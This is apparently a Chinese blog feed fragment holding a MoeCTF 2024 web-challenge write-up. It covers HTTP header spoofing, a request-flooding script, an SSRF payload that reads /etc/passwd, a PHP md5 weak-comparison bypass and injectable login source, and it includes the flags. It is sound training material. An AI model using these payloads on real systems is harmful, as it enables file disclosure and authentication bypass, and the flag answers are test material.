\??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT</span><br><span class="line">0xffffab86201e8000 0x0000000061a93000 \SystemRoot\System32\Config\BBI</span><br><span class="line">0xffffab862021c000 0x000000006f3e3000 \REGISTRY\USER\S-1-5-19</span><br><span class="line">0xffffab8620fc1000 0x000000003d5cd000 \??\C:\Windows\AppCompat\Programs\Amcache.hve</span><br><span class="line">0xffffab86205ca000 0x000000002068c000 \??\C:\Users\WH\ntuser.dat</span><br><span class="line">0xffffab86218ba000 0x000000001c7f8000 \??\C:\Users\WH\AppData\Local\Microsoft\Windows\UsrClass.dat</span><br><span class="line">0xffffab8621dfd000 0x0000000001dce000 \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.ShellExperienceHost_10.0.14393.2068_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat</span><br><span class="line">0xffffab86220bd000 0x0000000054a10000 \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat</span><br><span class="line">                                                                                                                                                                                                 </span><br></pre></td></tr></table></figure><p>0xffffab861963e000</p>]]></content>
      
      
      
        <tags>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moectf2024_web方向wp</title>
      <link href="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/"/>
      <url>/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Moectf-2024-web方向wp"><a href="#Moectf-2024-web方向wp" class="headerlink" title="Moectf_2024_web方向wp"></a>Moectf_2024_web方向wp</h1><h2 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a><strong>弗拉格之地的入口</strong></h2><p>提示爬虫，想到robots.txt，访问发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Robots.txt file for xdsec.org</span><br><span class="line"># only robots can find the entrance of web-tutor</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /webtutorEntry.php</span><br></pre></td></tr></table></figure><p>然后访问&#x2F;webtutorEntry.php</p><p><strong>moectf{COnGrAtU1@tION-foR-knowIng-r0Bots_TXt145cd}</strong></p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a><strong>ez_http</strong></h2><p>提示POST方法，随便发个空的POST，提示POST一个imoau&#x3D;sb，然后是GET一个xt&#x3D;大帅b（URL编码），然后加Referer:<a href="https://www.xidian.edu.cn/,%E5%86%8D%E5%8A%A0">https://www.xidian.edu.cn/,再加</a> cookie: user&#x3D;admin，再把UA头改成 MoeDedicatedBrowser,再加一个XFF标签127.0.0.1，得到flag，最后就像这样</p><p><img src="/moectf2024-web%E6%96%B9%E5%90%91wp/ez_http-1.png" alt="ez_http-1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">post请求和get请求自然不必多说，一个是在url后面以?get_parameter=value存在，另一个在http请求体中以post_parameter=value的形式存在；</span><br><span class="line">Referer表示的是从哪个网页跳转来的；</span><br><span class="line">cookie是网站识别用户的凭证；比如登陆过的网站无需再次登录就是cookie的作用；</span><br><span class="line">UA头UserAgent可以可以反映请求者所使用的浏览器，操作系统之类的；</span><br><span class="line">XFF标签X-Forwarded-For表示的是源IP，常用于IP地址伪造，用Client-Ip也是有的；</span><br></pre></td></tr></table></figure><h2 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a><strong>ProveYourLove</strong></h2><p>页面如下：</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/ProveYourLove-1.png" alt="ProveYourLove-1"></p><p>源代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">  &lt;script&gt;</span><br><span class="line">        document.addEventListener(&#x27;DOMContentLoaded&#x27;, function() &#123;</span><br><span class="line">            // 获取当前表白份数</span><br><span class="line">            fetch(&#x27;/confession_count&#x27;)</span><br><span class="line">                .then(response =&gt; response.json())</span><br><span class="line">                .then(data =&gt; &#123;</span><br><span class="line">                    document.getElementById(&#x27;confessionCount&#x27;).textContent = data.count;</span><br><span class="line">                    document.getElementById(&#x27;flag&#x27;).textContent = data.flag;</span><br><span class="line">                    document.getElementById(&#x27;Qixi_flag&#x27;).textContent = data.Qixi_flag;</span><br><span class="line">                &#125;)</span><br><span class="line">                .catch(error =&gt; &#123;</span><br><span class="line">                    console.error(&#x27;Error:&#x27;, error);</span><br><span class="line">                &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        document.getElementById(&#x27;confessionForm&#x27;).addEventListener(&#x27;submit&#x27;, function(event) &#123;</span><br><span class="line">            event.preventDefault(); // 阻止表单的默认提交行为</span><br><span class="line"></span><br><span class="line">            // 检查设备是否已提交过表白</span><br><span class="line">            if (localStorage.getItem(&#x27;confessionSubmitted&#x27;)) &#123;</span><br><span class="line">                alert(&#x27;您已经提交过表白，不能重复提交。&#x27;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 发起 OPTIONS 请求</span><br><span class="line">            fetch(&#x27;/questionnaire&#x27;, &#123;</span><br><span class="line">                method: &#x27;OPTIONS&#x27;</span><br><span class="line">            &#125;)</span><br><span class="line">            .then(response =&gt; &#123;</span><br><span class="line">                if (!response.ok) &#123;</span><br><span class="line">                    throw new Error(&#x27;OPTIONS 请求失败&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // 获取表单数据</span><br><span class="line">                const formData = new FormData(event.target);</span><br><span class="line">                const data = &#123;&#125;;</span><br><span class="line">                formData.forEach((value, key) =&gt; &#123;</span><br><span class="line">                    data[key] = value;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                // 提交表白数据</span><br><span class="line">                return fetch(&#x27;/questionnaire&#x27;, &#123;</span><br><span class="line">                    method: &#x27;POST&#x27;,</span><br><span class="line">                    headers: &#123;</span><br><span class="line">                        &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    body: JSON.stringify(data)</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;)</span><br><span class="line">            .then(response =&gt; response.json())</span><br><span class="line">            .then(result =&gt; &#123;</span><br><span class="line">                if (result.success) &#123;</span><br><span class="line">                    alert(&#x27;表白提交成功！&#x27;);</span><br><span class="line">                    localStorage.setItem(&#x27;confessionSubmitted&#x27;, &#x27;true&#x27;);</span><br><span class="line"></span><br><span class="line">                    // 更新表白份数</span><br><span class="line">                    fetch(&#x27;/confession_count&#x27;)</span><br><span class="line">                        .then(response =&gt; response.json())</span><br><span class="line">                        .then(data =&gt; &#123;</span><br><span class="line">                            document.getElementById(&#x27;confessionCount&#x27;).textContent = data.count;</span><br><span class="line">                            document.getElementById(&#x27;flag&#x27;).textContent = data.flag;</span><br><span class="line">                            document.getElementById(&#x27;Qixi_flag&#x27;).textContent = data.Qixi_flag;</span><br><span class="line">                        &#125;)</span><br><span class="line">                        .catch(error =&gt; &#123;</span><br><span class="line">                            console.error(&#x27;Error:&#x27;, error);</span><br><span class="line">                        &#125;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    alert(&#x27;表白提交失败，请稍后重试。&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(error =&gt; &#123;</span><br><span class="line">                console.error(&#x27;Error:&#x27;, error);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题的机制是，你需要填写图中的表单，提交表白，要达到300次就给你flag，但是当第一次提交后第二次再交会显示：你已提交过表白，请勿重复提交；原因在于：当服务器发送你的表单之后，会在localstorage留下confessionSubmitted标签，且值为True，那实际上，我们写脚本本身就可以绕开这个机制，即使内容重复也没有关系，所以直接写个脚本就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL to send requests to</span></span><br><span class="line">url = <span class="string">&quot;http://ip:port/questionnaire&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Headers for the OPTIONS request</span></span><br><span class="line">headers_options = &#123;</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;YOUR_CONTAINER_IP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;YOUR_CONTAINER_IP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Headers for the POST request</span></span><br><span class="line">headers_post = &#123;</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;122&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;YOUR_CONTAINER_IP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;YOUR_CONTAINER_IP&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload for the POST request</span></span><br><span class="line">data_post = &#123;</span><br><span class="line">    <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;121&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user_gender&quot;</span>: <span class="string">&quot;male&quot;</span>,</span><br><span class="line">    <span class="string">&quot;target&quot;</span>: <span class="string">&quot;212121212&quot;</span>,</span><br><span class="line">    <span class="string">&quot;target_gender&quot;</span>: <span class="string">&quot;male&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;anonymous&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop to send requests 300 times</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send POST request</span></span><br><span class="line">    response_post = requests.post(url, headers=headers_post, json=data_post)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;POST Response Status Code: <span class="subst">&#123;response_post.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后得到flag：</p><p><strong>moectf{CONgr4TulAtlOnS_on-Bec0minG-4_IiCk1Ng_dog216}</strong><br>Qixi_flag: moeCTF{Happy_Chin3s3_Va13ntin3’s_Day,_Baby.}</p><h2 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a><strong>ImageCloud前置</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$image_info</span> = getimages\<span class="title function_ invoke__">moectf2024izefromstring</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$mime_type</span> = <span class="variable">$image_info</span>[<span class="string">&#x27;mime&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: &#x27;</span> . <span class="variable">$mime_type</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源代码如上</p><p>然后大致上就是从url参数里获取一个url，然后拿来curl；</p><p>curl返回的数据放到getimages\moectf2024izefromstring获取图片大小，然后一通操作后关闭curl会话，再echo返回的信息；</p><p>那我这里就可以用file:&#x2F;&#x2F;伪协议curl返回我要的东西，因为即使没有图片信息getimages\moectf2024izefromstring只会warning所以并不影响，题目说flag在&#x2F;etc&#x2F;passwd里面，所以就可以直接?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Warning: Trying to access array offset on false in /var/www/html/index.php on line 13</span><br><span class="line"></span><br><span class="line">Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/index.php:13) in /var/www/html/index.php on line 15</span><br><span class="line">root:x:0:0:root:/root:/bin/sh bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin www-data:x:1000:1000:Linux User,,,:/home/www-data:/sbin/nologin nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin moectf&#123;I-AM-VEry_sorRY_A6ouT-tHis40ddab44&#125;</span><br></pre></td></tr></table></figure><p><strong>moectf{I-AM-VEry_sorRY_A6ouT-tHis40ddab44}</strong></p><p>php支持的伪协议如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1 file:// — 访问本地文件系统</span><br><span class="line">2 http:// — 访问 HTTP(s) 网址</span><br><span class="line">3 ftp:// — 访问 FTP(s) URLs</span><br><span class="line">4 php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">5 zlib:// — 压缩流</span><br><span class="line">6 data:// — 数据（RFC 2397）</span><br><span class="line">7 glob:// — 查找匹配的文件路径模式</span><br><span class="line">8 phar:// — PHP 归档</span><br><span class="line">9 ssh2:// — Secure Shell 2</span><br><span class="line">10 rar:// — RAR</span><br><span class="line">11 ogg:// — 音频流</span><br><span class="line">12 expect:// — 处理交互式的流</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a><strong>静态网页</strong></h2><p>这个静态博客看板娘的话有hint</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B51.png" alt="静态网页1"></p><p>但是最后其实是直接用burp扫描出来的:向&#x2F;api&#x2F;get发送请求（和上面的hint对应），发现一个hint:</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B52.png" alt="静态网页2"></p><p>跳转后是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;final1l1l_challenge.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="variable">$b</span>[<span class="variable">$a</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;noooooooooooo&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>( <span class="string">&#x27;Notice the param type!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>( <span class="string">&#x27;Where is your param?&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>根据源码条件1要设置get参数a和post参数b，2且a，b不能为数字或者数字字符串，也包含了以数字为键的数组，3且弱比较a&#x3D;&#x3D;0，4a的MD5</p><p>&#x3D;&#x3D;b的a键的值；</p><p>那么payload就设置为a&#x3D;”False”,b[“False”]&#x3D;c4834a58ddd21fa19719fa1f3edc86e7</p><p>注意这里计算MD5是把引号也算进去的了；</p><p><strong>moectf{ls-mY_wIFe_Plo_Ch@N_cuTE_or_YoUr_WIfe_15_pHP?145}</strong></p><h2 id="电院-Backend"><a href="#电院-Backend" class="headerlink" title="电院_Backend"></a><strong>电院_Backend</strong></h2><p>这个用dirserach来扫描，发现&#x2F;admin目录</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/%E7%94%B5%E9%99%A21.png" alt="电院1"></p><p>然后发现登录入口</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/%E7%94%B5%E9%99%A22.png" alt="电院2"></p><p>看看给的源码，验证码正常输入就可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>)&#123;</span><br><span class="line">    <span class="variable">$verify_code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;verify_code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证验证码</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$verify_code</span>) || <span class="variable">$verify_code</span> !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;验证码错误啦，再输入吧&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/&quot;</span>, <span class="variable">$email</span>)||<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or/i&quot;</span>, <span class="variable">$email</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">0</span>,<span class="string">&#x27;info&#x27;</span> =&gt; <span class="string">&#x27;不存在邮箱为： &#x27;</span>.<span class="variable">$email</span>.<span class="string">&#x27; 的管理员账号！&#x27;</span>));</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;captcha_code&#x27;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pwd</span>);</span><br><span class="line">    <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="string">&quot;xdsec&quot;</span>,<span class="number">3306</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE email=&#x27;<span class="subst">$email</span>&#x27; AND pwd=&#x27;<span class="subst">$pwd</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>] = <span 